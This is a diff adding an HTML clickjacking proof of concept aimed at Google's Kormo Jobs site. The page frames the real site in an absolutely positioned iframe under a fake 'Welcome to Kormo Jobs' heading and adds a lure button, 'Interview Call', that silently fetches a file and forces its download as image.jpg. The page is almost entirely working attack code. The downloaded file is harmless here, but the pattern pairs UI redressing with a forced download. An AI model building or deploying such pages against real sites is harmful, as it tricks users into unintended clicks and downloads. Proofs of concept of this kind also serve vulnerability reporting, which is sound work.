@@ -1,0 +1,45 @@
+<html>
+<head><title>Click Jacking Poc</title></head>
+<body>
+<h1>Welcome to Kormo Jobs</h1>
+</script>
+<style>
+iframe {
+width: 900px;
+height: 1000px;
+position: absolute;
+top: 0; right: 10;
+filter: alpha(opacity=50);
+opacity: 1.0;
+}
+</style>
+
+ <button onclick="download()">
+          Interview Call
+      </button>
+<iframe src="https://kormo.google.com/workers_en.html"></iframe>
+<script src=
+"https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js">
+   </script>
+   <script>  
+      function download(){
+          axios({
+              url:'https://source.unsplash.com/random/500x500',
+              method:'GET',
+              responseType: 'blob'
+      })
+      .then((response) => {
+             const url = window.URL
+             .createObjectURL(new Blob([response.data]));
+                    const link = document.createElement('a');
+                    link.href = url;
+                    link.setAttribute('download', 'image.jpg');
+                    document.body.appendChild(link);
+                    link.click();
+      })
+      }
+       
+   </script>
+   
+</body>
+</html>
